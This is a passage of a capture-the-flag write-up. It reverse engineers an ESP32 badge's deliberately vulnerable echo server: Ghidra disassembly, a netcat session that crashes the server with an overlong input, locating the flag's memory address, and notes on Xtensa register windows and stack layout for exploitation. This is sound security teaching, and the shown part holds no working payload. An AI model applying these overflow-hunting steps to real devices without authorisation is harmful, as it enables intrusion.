+<span class="mi">4016</span><span class="n">f6af</span> <span class="n">e0</span> <span class="mi">08</span> <span class="mi">00</span>        <span class="n">callx8</span>     <span class="n">a8</span>
+</pre></div>
+</div>
+<p>So I guess <code class="docutils literal notranslate"><span class="pre">app_main</span></code> will be more interesting:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">400</span><span class="n">d791b</span> <span class="mi">65</span> <span class="mi">54</span> <span class="mi">00</span>        <span class="n">call8</span>      <span class="n">bsp_init</span>
+<span class="mi">400</span><span class="n">d791e</span> <span class="mi">65</span> <span class="mi">5</span><span class="n">f</span> <span class="mi">00</span>        <span class="n">call8</span>      <span class="n">bsp_rp2040_init</span>
+<span class="mi">400</span><span class="n">d7921</span> <span class="n">e5</span> <span class="n">db</span> <span class="n">ff</span>        <span class="n">call8</span>      <span class="n">show_startup_screen</span>
+<span class="mi">400</span><span class="n">d7924</span> <span class="n">e5</span> <span class="n">e8</span> <span class="n">ff</span>        <span class="n">call8</span>      <span class="n">start_service</span>
+<span class="mi">400</span><span class="n">d7927</span> <span class="n">a2</span> <span class="n">a0</span> <span class="mi">00</span>        <span class="n">movi</span>       <span class="n">a10</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mi">400</span><span class="n">d792a</span> <span class="mi">25</span> <span class="mi">96</span> <span class="n">ff</span>        <span class="n">call8</span>      <span class="n">show_main_screen</span>
+</pre></div>
+</div>
+<p>That <em>does</em> look interesting! Looks like this is the main app code, and the way it calls a bunch of functions in sequence matches the app behavior. Thanks again to the devs for leaving the debug symbols in there and not enabling optimizations like aggressive inlining which would have greatly obfuscated the program structure.</p>
+<p>Since we’re currently interested in what protocol the app serves, let’s dive into the <code class="docutils literal notranslate"><span class="pre">start_service</span></code> function:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span> <span class="o">...</span> <span class="n">some</span> <span class="n">initialization</span> <span class="o">...</span> <span class="p">]</span>
+<span class="mi">400</span><span class="n">d7839</span> <span class="n">c1</span> <span class="mi">56</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a12</span><span class="p">,</span><span class="n">DAT_400d0594</span>                 <span class="o">=</span> <span class="mi">00001000</span><span class="n">h</span>
+<span class="mi">400</span><span class="n">d783c</span> <span class="n">b1</span> <span class="n">bd</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a11</span><span class="p">,</span><span class="n">PTR_s_echo_server_400d0730</span>   <span class="o">=</span> <span class="mi">3</span><span class="n">f4037e0</span>
+<span class="mi">400</span><span class="n">d783f</span> <span class="n">a1</span> <span class="n">bd</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a10</span><span class="p">,</span><span class="o">-&gt;</span><span class="n">echo_server</span>                <span class="o">=</span> <span class="mi">400</span><span class="n">d7448</span>
+<span class="mi">400</span><span class="n">d7842</span> <span class="mi">25</span> <span class="n">e9</span> <span class="n">b4</span>        <span class="n">call8</span>      <span class="n">xTaskCreatePinnedToCore</span>
+<span class="p">[</span> <span class="o">...</span> <span class="n">more</span> <span class="n">initialization</span> <span class="o">...</span> <span class="p">]</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">echo_server</span></code>? Well shiver me timbers, might this be implementing a simple echo server that parrots back anything you send its way?</p>
+<p>Let’s update what we know, shall we?</p>
+<blockquote class="highlights">
+<div><ol class="arabic simple">
+<li><p>(updated) The app seems to be serving a simple “echo server”.</p></li>
+</ol>
+<ol class="arabic simple" start="7">
+<li><p>Register <code class="docutils literal notranslate"><span class="pre">a1</span></code> seems to be used as the stack pointer.</p></li>
+</ol>
+</div></blockquote>
+<p>Let’s try talking to that server again now and see how it behaves.</p>
+</section>
+</section>
+<section id="talking-to-the-echo-server">
+<h3>Talking to the echo server<a class="headerlink" href="#talking-to-the-echo-server" title="Permalink to this headline">#</a></h3>
+<p>Let’s talk to the server directly then:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">nc</span> <span class="pre">192.168.178.50</span> <span class="pre">1337</span></code></p>
+</div></blockquote>
+<p>The app asks us for permission to connect, we accept and netcat is connected!</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">Connection</span> <span class="pre">accepted!</span></code></p>
+</div></blockquote>
+<p>Likewise, the app screen has changed to</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">Handeling[sic!]</span> <span class="pre">connected</span> <span class="pre">client</span> <span class="pre">from:</span> <span class="pre">&lt;my</span> <span class="pre">laptop's</span> <span class="pre">IP&gt;</span></code></p>
+</div></blockquote>
+<p>Neat! Let’s talk to it:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">asdf</span>
+<span class="n">asdf</span>
+</pre></div>
+</div>
+<p>Ugh, I hate it when someone does that!</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Stop imitating me!
+Stop imitating me!
+</pre></div>
+</div>
+<p>ARRRGGH!</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>asdfglkjhasdflköajsdflkjahsdfglkjahsd
+asdfglkjhasdflköajsdflkjahsdfgl�
+�?9@
+</pre></div>
+</div>
+<p>…now wait a minute… that’s not quite what I typed!</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf
+asdfasdfasdfasdfasdfasdfasdfasdf�
+�?9@?asdfasdf
+</pre></div>
+</div>
+<p>…hmmmmm…</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf</span>
+</pre></div>
+</div>
+<p>…never gets a response, nor does anything I type after it. At least not over the network. The debug console however <em>does</em> give us a response:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>I (1346018) hack-me-if-you-can: Received 49 bytes
+Guru Meditation Error: Core  0 panic&#39;ed (LoadProhibited). Exception was unhandled.
+
+Core  0 register dump:
+PC      : 0x400df38d  PS      : 0x00060730  A0      : 0x800d731e  A1      : 0x3ffbf150
+A2      : 0x00000002  A3      : 0xffffffff  A4      : 0x00000001  A5      : 0x41900000
+A6      : 0x40a00000  A7      : 0x43480000  A8      : 0x00000001  A9      : 0x3ffbf1b0
+A10     : 0x00000001  A11     : 0x00000000  A12     : 0x3ffb40f0  A13     : 0x00000001
+A14     : 0x3ffbf2c0  A15     : 0x43480000  SAR     : 0x0000000e  EXCCAUSE: 0x0000001c
+EXCVADDR: 0x0000000f  LBEG    : 0x4000c2e0  LEND    : 0x4000c2f6  LCOUNT  : 0xffffffff
+
+Backtrace:0x400df38a:0x3ffbf150 0x400d731b:0x3ffbf1f0 0x400d739e:0x3ffbf210
+0x400d739e:0x3ffbf230 0x400d739e:0x3ffbf250 0x400d739e:0x3ffbf270
+0x400d739e:0x3ffbf290 0x400d739e:0x3ffbf2b0 0x400d739e:0x3ffbf2d0
+0x400d7670:0x3ffbf2f0 0x4008e055:0x3ffbf410
+
+ELF file SHA256: b1e3592d04801c8c
+
+Entering gdb stub now.
+$T0b#e6
+</pre></div>
+</div>
+<p>Looks like we successfully crashed the app, and for good this time - no crash handler to come to our rescue and fall back to the main menu. But instead we got a pretty nice register dump and backtrace!</p>
+<p>We can’t be sure yet, but the way how the echo string is being corrupted beyond a certain length, and the fact that increasing its length even further completely crashes the program, smells suspiciously like stack corruption, which would be a perfect entry point for an exploit!</p>
+<p>So let’s summarize our new findings:</p>
+<blockquote class="highlights">
+<div><ol class="arabic simple">
+<li><p>(updated) The app is a simple echo server which accepts connections via TCP and returns any string sent through the connection back to the client verbatim.</p></li>
+<li><p>(updated) The echo server seems to have a problem with requests beyond a certain length; judging by the corruption/crash it is likely that this is caused by overflowing a buffer on the stack.</p></li>
+</ol>
+<ol class="arabic simple" start="8">
+<li><p>In case of a fatal exception we get a register dump and backtrace on the USB console.</p></li>
+<li><p>There even seems to be a gdb stub available; let’s keep that in the back of our mind just in case.</p></li>
+</ol>
+</div></blockquote>
+</section>
+</section>
+<section id="the-game-plan">
+<h2><a class="toc-backref" href="#id17">The Game Plan</a><a class="headerlink" href="#the-game-plan" title="Permalink to this headline">#</a></h2>
+<p>It looks like we’re done with our first exploration of the target; let’s summarize our findings so far:</p>
+<ol class="arabic simple">
+<li><p>The app is a simple echo server which accepts connections via TCP and returns any string sent through the connection back to the client verbatim.</p></li>
+<li><p>The echo server seems to have a problem with requests beyond a certain length; judging by the corruption/crash it is likely that this is caused by overflowing a buffer on the stack.</p></li>
+<li><p>The badge developers seem to have implemented a pretty kickass crash recovery system.</p></li>
+<li><p>There’s a serial USB console which is a veritable <em>trove</em> of information!</p></li>
+<li><p>The difference between a badge that contains a flag and one that doesn’t seems to be a record in some non-volatile storage, and if that record is not present the app will use a dummy flag value.</p></li>
+<li><p>As a direct result from 5, we can conjecture that badges with a flag are running the <em>exact same binary</em> as we are, which would be great as we would be able to transfer our exploit without having to guess at differences between app variants.</p></li>
+<li><p>Register <code class="docutils literal notranslate"><span class="pre">a1</span></code> seems to be used as the stack pointer.</p></li>
+<li><p>In case of a fatal exception we get a register dump and backtrace on the USB console.</p></li>
+<li><p>There even seems to be a gdb stub available.</p></li>
+</ol>
+<p>We actually know enough now to come up with a more targeted plan of attack:</p>
+<ul class="simple">
+<li><p>Figure out where the flag we’re looking for resides in memory</p></li>
+<li><p>Understand the nature of the (suspected) stack overflow</p></li>
+<li><p>Figure out a way to exploit it in a way that we can extract the flag over the network</p></li>
+</ul>
+</section>
+<section id="where-s-the-flag">
+<h2><a class="toc-backref" href="#id18">Where’s the flag?</a><a class="headerlink" href="#where-s-the-flag" title="Permalink to this headline">#</a></h2>
+<p>This one might prove pretty easy since the app is helpfully providing us with debug output around its efforts to determine the flag.</p>
+<img alt="_images/flagstring.png" src="_images/flagstring.png" />
+<p>Well that was easy! That’s the fake flag that’s being set if the badge doesn’t contain a real flag.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      <span class="n">s_flag</span><span class="p">{</span><span class="n">not_a_real_flag</span><span class="p">}</span><span class="n">_3f4038c0</span>                <span class="n">XREF</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>     <span class="mi">400</span><span class="n">d0750</span><span class="p">(</span><span class="o">*</span><span class="p">)</span>
+<span class="mi">3</span><span class="n">f4038c0</span> <span class="mi">66</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">61</span>        <span class="n">ds</span>         <span class="s2">&quot;flag</span><span class="si">{not_a_real_flag}</span><span class="s2">&quot;</span>
+          <span class="mi">67</span> <span class="mi">7</span><span class="n">b</span> <span class="mi">6</span><span class="n">e</span>
+          <span class="mi">6</span><span class="n">f</span> <span class="mi">74</span> <span class="mi">5</span><span class="n">f</span>
+</pre></div>
+</div>
+<p>Let’s follow that xref back to the <code class="docutils literal notranslate"><span class="pre">start_service</span></code> function:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">400</span><span class="n">d78e3</span> <span class="mi">2</span><span class="n">c</span> <span class="mi">7</span><span class="n">c</span>           <span class="n">movi</span><span class="o">.</span><span class="n">n</span>     <span class="n">a12</span><span class="p">,</span><span class="mh">0x27</span>
+<span class="mi">400</span><span class="n">d78e5</span> <span class="n">b1</span> <span class="mi">9</span><span class="n">a</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a11</span><span class="p">,</span><span class="n">PTR_s_flag</span><span class="p">{</span><span class="n">not_a_real_flag</span><span class="p">}</span><span class="n">_400d0750</span>         <span class="o">=</span> <span class="mi">3</span><span class="n">f4038c0</span>
+<span class="mi">400</span><span class="n">d78e8</span> <span class="n">a1</span> <span class="mi">98</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a10</span><span class="p">,</span><span class="o">-&gt;</span><span class="n">flag</span>                                       <span class="o">=</span> <span class="mi">3</span><span class="n">ffb5358</span>
+<span class="mi">400</span><span class="n">d78eb</span> <span class="mi">81</span> <span class="mi">9</span><span class="n">b</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a8</span><span class="p">,</span><span class="n">DAT_400d0758</span>                                  <span class="o">=</span> <span class="mi">400015</span><span class="n">D4h</span>
+<span class="mi">400</span><span class="n">d78ee</span> <span class="n">e0</span> <span class="mi">08</span> <span class="mi">00</span>        <span class="n">callx8</span>     <span class="n">a8</span>
+</pre></div>
+</div>
+<p>Without even looking at the disassembly, I’m going to bet you that the function indirectly called here is <code class="docutils literal notranslate"><span class="pre">memcpy</span></code>. This call occurs in a code block that is executed after a call to <code class="docutils literal notranslate"><span class="pre">nvs_get_str</span></code> returns a nonzero value, and that same code block contains a call to <code class="docutils literal notranslate"><span class="pre">esp_log_write</span></code> with a data pointer to something that looks suspiciously like a string:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      DAT_3f403874
+3f403874 1b              ??         1Bh
+3f403875 5b              ??         5Bh    [
+3f403876 30              ??         30h    0
+3f403877 3b              ??         3Bh    ;
+3f403878 33              ??         33h    3
+3f403879 32              ??         32h    2
+3f40387a 6d              ??         6Dh    m
+3f40387b 49              ??         49h    I
+3f40387c 20              ??         20h
+3f40387d 28              ??         28h    (
+3f40387e 25              ??         25h    %
+3f40387f 75              ??         75h    u
+3f403880 29              ??         29h    )
+</pre></div>
+</div>
+<p>Let’s help Ghidra along and convert it to a string (right click -&gt; Data -&gt; TerminatedCString):</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      <span class="n">s__</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">32</span><span class="n">mI_</span><span class="p">(</span><span class="o">%</span><span class="n">u</span><span class="p">)</span><span class="n">_</span><span class="o">%</span><span class="n">s</span><span class="p">:</span><span class="n">_No_flag_found_i_3f403874</span>
+<span class="mi">3</span><span class="n">f403874</span> <span class="mi">1</span><span class="n">b</span> <span class="mi">5</span><span class="n">b</span> <span class="mi">30</span>        <span class="n">ds</span>         <span class="mi">1</span><span class="n">Bh</span><span class="p">,</span><span class="s2">&quot;[0;32mI (</span><span class="si">%u</span><span class="s2">) </span><span class="si">%s</span><span class="s2">: No flag found in hackmei</span>
+          <span class="mi">3</span><span class="n">b</span> <span class="mi">33</span> <span class="mi">32</span>
+          <span class="mi">6</span><span class="n">d</span> <span class="mi">49</span> <span class="mi">20</span>
+</pre></div>
+</div>
+<p>Well, there’s our console trace again! Looks like this code block is the “if no flag in NVS” path. The code block above it seems to be the “if there’s a flag in NVS” path, and it’s got another suspicious call:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">400</span><span class="n">d789e</span> <span class="n">a5</span> <span class="n">bb</span> <span class="n">ba</span>        <span class="n">call8</span>      <span class="n">malloc</span>
+<span class="mi">400</span><span class="n">d78a1</span> <span class="mi">3</span><span class="n">d</span> <span class="mi">0</span><span class="n">a</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a3</span><span class="p">,</span><span class="n">a10</span>
+<span class="mi">400</span><span class="n">d78a3</span> <span class="n">d2</span> <span class="n">c1</span> <span class="mi">14</span>        <span class="n">addi</span>       <span class="n">a13</span><span class="p">,</span><span class="n">a1</span><span class="p">,</span><span class="mh">0x14</span>
+<span class="mi">400</span><span class="n">d78a6</span> <span class="n">cd</span> <span class="mi">0</span><span class="n">a</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a12</span><span class="p">,</span><span class="n">a10</span>
+<span class="mi">400</span><span class="n">d78a8</span> <span class="n">b1</span> <span class="n">a6</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a11</span><span class="p">,</span><span class="n">PTR_s_flag_400d0740</span>   <span class="o">=</span> <span class="mi">3</span><span class="n">f403830</span>
+<span class="mi">400</span><span class="n">d78ab</span> <span class="n">a2</span> <span class="mi">21</span> <span class="mi">04</span>        <span class="n">l32i</span>       <span class="n">a10</span><span class="p">,</span><span class="n">a1</span><span class="p">,</span><span class="mh">0x10</span><span class="o">=&gt;</span><span class="n">Stack</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span>
+<span class="mi">400</span><span class="n">d78ae</span> <span class="mi">65</span> <span class="mi">67</span> <span class="mi">16</span>        <span class="n">call8</span>      <span class="n">nvs_get_str</span>
+<span class="mi">400</span><span class="n">d78b1</span> <span class="mi">21</span> <span class="n">a5</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a2</span><span class="p">,</span><span class="o">-&gt;</span><span class="n">flag</span>                 <span class="o">=</span> <span class="mi">3</span><span class="n">ffb5358</span>
+<span class="mi">400</span><span class="n">d78b4</span> <span class="mi">2</span><span class="n">c</span> <span class="mi">6</span><span class="n">c</span>           <span class="n">movi</span><span class="o">.</span><span class="n">n</span>     <span class="n">a12</span><span class="p">,</span><span class="mh">0x26</span>
+<span class="mi">400</span><span class="n">d78b6</span> <span class="n">bd</span> <span class="mi">03</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a11</span><span class="p">,</span><span class="n">a3</span>
+<span class="mi">400</span><span class="n">d78b8</span> <span class="n">ad</span> <span class="mi">02</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a10</span><span class="p">,</span><span class="n">a2</span>
+<span class="mi">400</span><span class="n">d78ba</span> <span class="mi">81</span> <span class="n">a7</span> <span class="n">e3</span>        <span class="n">l32r</span>       <span class="n">a8</span><span class="p">,</span><span class="n">memcpy</span>                 <span class="o">=</span> <span class="mi">400015</span><span class="n">D4h</span>
+<span class="mi">400</span><span class="n">d78bd</span> <span class="n">e0</span> <span class="mi">08</span> <span class="mi">00</span>        <span class="n">callx8</span>     <span class="n">a8</span>
+</pre></div>
+</div>
+<p>Note that I renamed our pointer from above to <code class="docutils literal notranslate"><span class="pre">memcpy</span></code> to make its meaning clear. So we’re apparently loading the flag string from NVS into a <code class="docutils literal notranslate"><span class="pre">malloc``ed</span> <span class="pre">bit</span> <span class="pre">of</span> <span class="pre">memory,</span> <span class="pre">and</span> <span class="pre">then</span> <span class="pre">``memcpy</span></code> the value over to a static location; the same location that we copied the fake flag to in the other code block. I bet you that’s the flag location we should extract. I agree, the name <code class="docutils literal notranslate"><span class="pre">flag</span></code> could have tipped me off early on but where’s the fun in that?</p>
+<p>So we conclude: <strong>The flag sits at 0x3ffb5358!</strong></p>
+</section>
+<section id="reversing-the-echo-server">
+<h2><a class="toc-backref" href="#id19">Reversing the echo server</a><a class="headerlink" href="#reversing-the-echo-server" title="Permalink to this headline">#</a></h2>
+<p>Next up let’s reverse the echo server and find out why it’s crashing. Given how the <code class="docutils literal notranslate"><span class="pre">start_service</span></code> routine sets up <code class="docutils literal notranslate"><span class="pre">echo_server</span></code> as the main thread function for the service thread let us start there:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">400</span><span class="n">d747c</span> <span class="mi">65</span> <span class="n">c9</span> <span class="mi">29</span>        <span class="n">call8</span>      <span class="n">lwip_socket</span>
+<span class="p">[</span> <span class="o">...</span> <span class="p">]</span>
+<span class="mi">400</span><span class="n">d74c4</span> <span class="mi">25</span> <span class="mi">19</span> <span class="mi">2</span><span class="n">a</span>        <span class="n">call8</span>      <span class="n">lwip_setsockopt</span>
+<span class="p">[</span> <span class="o">...</span> <span class="p">]</span>
+<span class="mi">400</span><span class="n">d74d4</span> <span class="mi">25</span> <span class="mi">74</span> <span class="mi">29</span>        <span class="n">call8</span>      <span class="n">lwip_bind</span>
+<span class="p">[</span> <span class="o">...</span> <span class="p">]</span>
+<span class="mi">400</span><span class="n">d7535</span> <span class="n">e5</span> <span class="mi">85</span> <span class="mi">29</span>        <span class="n">call8</span>      <span class="n">lwip_listen</span>
+</pre></div>
+</div>
+<p>Hmm, looks like this app is using a TCP implementation called <code class="docutils literal notranslate"><span class="pre">lwip</span></code> (guessing that means LightWeight IP) and its API looks like the standard Unix socket API <a class="footnote-reference brackets" href="#id10" id="id5">2</a>. That makes reversing a lot easier since I can transfer my knowledge of that API to this unknown target.</p>
+<p>Just scrolling through the disassembly some more, we see a bunch more <code class="docutils literal notranslate"><span class="pre">lwip</span></code> calls… <code class="docutils literal notranslate"><span class="pre">accept</span></code>, <code class="docutils literal notranslate"><span class="pre">setsockopt</span></code>, then a call to <code class="docutils literal notranslate"><span class="pre">ask_permission</span></code> (gee i wonder what <em>that</em> does), <code class="docutils literal notranslate"><span class="pre">send</span></code> and finally <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code>:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">400</span><span class="n">d766a</span> <span class="n">b2</span> <span class="n">a0</span> <span class="mi">09</span>        <span class="n">movi</span>       <span class="n">a11</span><span class="p">,</span><span class="mh">0x9</span>
+<span class="mi">400</span><span class="n">d766d</span> <span class="mi">20</span> <span class="n">a2</span> <span class="mi">20</span>        <span class="n">mov</span>        <span class="n">a10</span><span class="p">,</span><span class="n">pvParameters</span>
+<span class="mi">400</span><span class="n">d7670</span> <span class="n">a5</span> <span class="n">d1</span> <span class="n">ff</span>        <span class="n">call8</span>      <span class="n">do_echo_recursive</span>
+</pre></div>
+</div>
+<p>I bet that last one is the actual echo implementation, but why <code class="docutils literal notranslate"><span class="pre">recursive</span></code>?</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      **************************************************************
+                      *                          FUNCTION                          *
+                      **************************************************************
+                      _Bool __stdcall do_echo_recursive(int sock, int count)
+      _Bool             a2:1           &lt;RETURN&gt;
+      int               a2:4           sock
+      int               a3:4           count
+                      do_echo_recursive                               XREF[4]:     Entry Point(*), 400d739e(*),
+                                                                                  echo_server:400d7670(*),
+                                                                                  .debug_frame::00004de0(*)
+400d738c 36 41 00        entry      a1,0x20
+400d738f ad 02           mov.n      a10,sock
+400d7391 cc 73           bnez.n     count,LAB_400d739c
+400d7393 65 f9 ff        call8      do_echo
+400d7396 c6 01 00        j          LAB_400d73a1
+400d7399 00              ??         00h
+400d739a 00              ??         00h
+400d739b 00              ??         00h
+                      LAB_400d739c                                    XREF[1]:     400d7391(j)
+400d739c 0b b3           addi.n     a11,count,-0x1
+400d739e e5 fe ff        call8      do_echo_recursive
+                      LAB_400d73a1                                    XREF[1]:     400d7396(j)
+400d73a1 2d 0a           mov.n      sock,a10
+400d73a3 1d f0           retw.n
+</pre></div>
+</div>
+<p>Huh, so this little function appears to be calling itself recursively a bunch of times (depending on the <code class="docutils literal notranslate"><span class="pre">count</span></code> parameter) and then eventually call <code class="docutils literal notranslate"><span class="pre">do_echo</span></code>. Looking at the call site it seems like one of the parameters is 9; that’s probably our <code class="docutils literal notranslate"><span class="pre">count</span></code>.</p>
+<div class="admonition-wait-what admonition">
+<p class="admonition-title">Wait what?!</p>
+<p>Why is <code class="docutils literal notranslate"><span class="pre">count</span></code> being loaded into <code class="docutils literal notranslate"><span class="pre">a11</span></code> when the function expects it in <code class="docutils literal notranslate"><span class="pre">a3</span></code>?!</p>
+</div>
+<p>I guess it’s time to introduce one of the most unusual features of the Xtensa architecture.</p>
+</section>
+<section id="details-of-the-xtensa-architecture-you-never-wanted-to-learn-but-now-have-to">
+<h2><a class="toc-backref" href="#id20">Details of the Xtensa architecture you never wanted to learn but now have to</a><a class="headerlink" href="#details-of-the-xtensa-architecture-you-never-wanted-to-learn-but-now-have-to" title="Permalink to this headline">#</a></h2>
+<section id="windowed-registers">
+<h3>Windowed registers<a class="headerlink" href="#windowed-registers" title="Permalink to this headline">#</a></h3>
+<p>The Xtensa architecture optionally implements something called “windowed registers”, where the core has a physical register bank that is larger than the architected 16 GPRs. At any time, a contiguous range of 16 of these physical registers is visible to code; if the window exceeds the end of the physical register bank it wraps around to the beginning.</p>
+<p>Each <code class="docutils literal notranslate"><span class="pre">call</span></code> instruction optionally shifts this register window by four, eight or twelve registers - that’s why there are four flavors of <code class="docutils literal notranslate"><span class="pre">call</span></code>: <code class="docutils literal notranslate"><span class="pre">call0</span></code>, <code class="docutils literal notranslate"><span class="pre">call4</span></code>, <code class="docutils literal notranslate"><span class="pre">call8</span></code> and <code class="docutils literal notranslate"><span class="pre">call12</span></code>. When, say, a function called by <code class="docutils literal notranslate"><span class="pre">call8</span></code> is entered, <code class="docutils literal notranslate"><span class="pre">a8</span></code> becomes <code class="docutils literal notranslate"><span class="pre">a0</span></code>, <code class="docutils literal notranslate"><span class="pre">a9</span></code> becomes <code class="docutils literal notranslate"><span class="pre">a1</span></code> and so forth. The previous <code class="docutils literal notranslate"><span class="pre">a0..a7</span></code> become inaccessible, and new <code class="docutils literal notranslate"><span class="pre">a8..a15</span></code> are exposed at the top end of the register range. Upon return from the function, the process is reversed and the previous <code class="docutils literal notranslate"><span class="pre">a0..a7</span></code> become visible again.</p>
+<p>This method effectively turns the physical register bank into a very fast kind of stack; in the <code class="docutils literal notranslate"><span class="pre">call8</span></code> example the caller can be sure that its <code class="docutils literal notranslate"><span class="pre">a0..a7</span></code> will be preserved, and the callee does not have to worry about saving off any registers before using them. This saves a lot of stack access and improves execution performance.</p>
+<p>This is also why the <code class="docutils literal notranslate"><span class="pre">count</span></code> parameter is loaded into <code class="docutils literal notranslate"><span class="pre">a11</span></code> - inside <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code> it magically turns into <code class="docutils literal notranslate"><span class="pre">a3</span></code> because <code class="docutils literal notranslate"><span class="pre">call8</span></code> is used.</p>
+<div class="admonition-wait-what admonition">
+<p class="admonition-title">Wait what?!</p>
+<p>That’s nice and all, but that “register stack” is not infinite - won’t we eventually start overwriting saved register values?</p>
+</div>
+<p>That’s a very correct observation and we need to do something about this! Of course this register windowing is not a panacea; eventually we’ll still have to save register values off to the stack. But the windowing mechanism will defer these stack accesses to a later point, and as long as the call stack only swings back and forth by 2-3 calls (which is usually the case in hot parts of a program) no stack access will be necessary at all.</p>
+<p>Still, any register <em>might</em> eventually have to be saved, so <em>each function must provide a save area for its registers on the stack</em>. This is why, for example, <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code> reserves 32 bytes of stack even though it doesn’t have any locals - it uses <code class="docutils literal notranslate"><span class="pre">call8</span></code> to call other functions and thus must reserve space for 8 registers to be saved.</p>
+<p>This is why <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code> exists. It makes sure to rotate the register window enough times that we can be <em>certain</em> a significant amount of registers has been actually saved to the stack by the time we’re inside <code class="docutils literal notranslate"><span class="pre">do_echo</span></code>, for us to overwrite. Once again, the app developers are actively helping us out &lt;3</p>
+</section>
+<section id="the-call-entry-worksplit">
+<h3>The <code class="docutils literal notranslate"><span class="pre">call</span></code> - <code class="docutils literal notranslate"><span class="pre">entry</span></code> worksplit<a class="headerlink" href="#the-call-entry-worksplit" title="Permalink to this headline">#</a></h3>
+<p>Finally, there is one more detail we have to talk about: A callee does not have to know nor care whether it’s been called by <code class="docutils literal notranslate"><span class="pre">call4</span></code>, <code class="docutils literal notranslate"><span class="pre">call8</span></code> or any other call instruction - it must be agnostic of the amount of registers saved by the caller.</p>
+<p>For this reason, it is not the <code class="docutils literal notranslate"><span class="pre">callN</span></code> instruction which moves the register window, but the <code class="docutils literal notranslate"><span class="pre">entry</span></code> instruction at the beginning of the callee. The amount of registers to move is communicated to it by the <code class="docutils literal notranslate"><span class="pre">callN</span></code> instruction in the topmost two bits of <code class="docutils literal notranslate"><span class="pre">a0</span></code>, with the remaining bits containing the return address. Likewise, the <code class="docutils literal notranslate"><span class="pre">retw</span></code> instruction will use these top two bits to determine by how much to move the window back.</p>
+<p>This has several direct consequences which will become important later:</p>
+<ol class="arabic simple">
+<li><p>A return “address” on the stack might <em>not</em> look like an actual program address at first glance.</p></li>
+<li><p>When constructing our own stack for an exploit we must be mindful of this.</p></li>
+<li><p>Calls must stay within the same 1GiB segment of address space since the topmost two bits of the PC cannot be modified by the <code class="docutils literal notranslate"><span class="pre">callN</span></code> instructions.</p></li>
+</ol>
+<p>For more details about windowed registers, I recommend reading the <a class="reference external" href="xtensa.pdf">Xtensa ISA reference</a>, chapter 4.7.1.</p>
+</section>
+<section id="stack-layout">
+<h3>Stack layout<a class="headerlink" href="#stack-layout" title="Permalink to this headline">#</a></h3>
+<p>The theory lesson ain’t over yet though. Sorry not sorry. We still have to understand how the stack is laid out <em>exactly</em>, and it’s not entirely trivial.</p>
+<p>See, Xtensa has another quirk up its sleeve: Backtracing the stack must be possible without knowledge of the specific routines, so the return address and the pointer to the previous stack frame must be at the same location relative to the current stack pointer regardless of the size of the stack frame.</p>
+<p>To realize this, Tensilica came up with the following stack layout:</p>
+<ul class="simple">
+<li><p>The return address and stack pointer for the current function are in <code class="docutils literal notranslate"><span class="pre">a0</span></code> and <code class="docutils literal notranslate"><span class="pre">a1</span></code> respectively <a class="footnote-reference brackets" href="#id11" id="id6">3</a>.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">r0..r3</span></code> will be saved to a “base save area” which is part of the current stack frame - located <em>below</em> the current stack pointer. This area is the same size regardless of <code class="docutils literal notranslate"><span class="pre">callN</span></code> instruction used and thus provides a reliable way of accessing <code class="docutils literal notranslate"><span class="pre">r0</span></code> and <code class="docutils literal notranslate"><span class="pre">r1</span></code>.</p></li>
+<li><p>Any other registers will be saved to an “extra save area” which is part of the caller’s stack frame - only the caller knows the required size after all. It can be accessed through the recovered value of <code class="docutils literal notranslate"><span class="pre">r1</span></code>.</p></li>
+</ul>
+<p>Because that’s totally not confusing at all, here’s an image to illustrate the concept, pulled straight from the ISA reference. I found myself going back to this figure many times.</p>
+<img alt="_images/stackframe.png" src="_images/stackframe.png" />
+</section>
+</section>
+<section id="coffee-break">
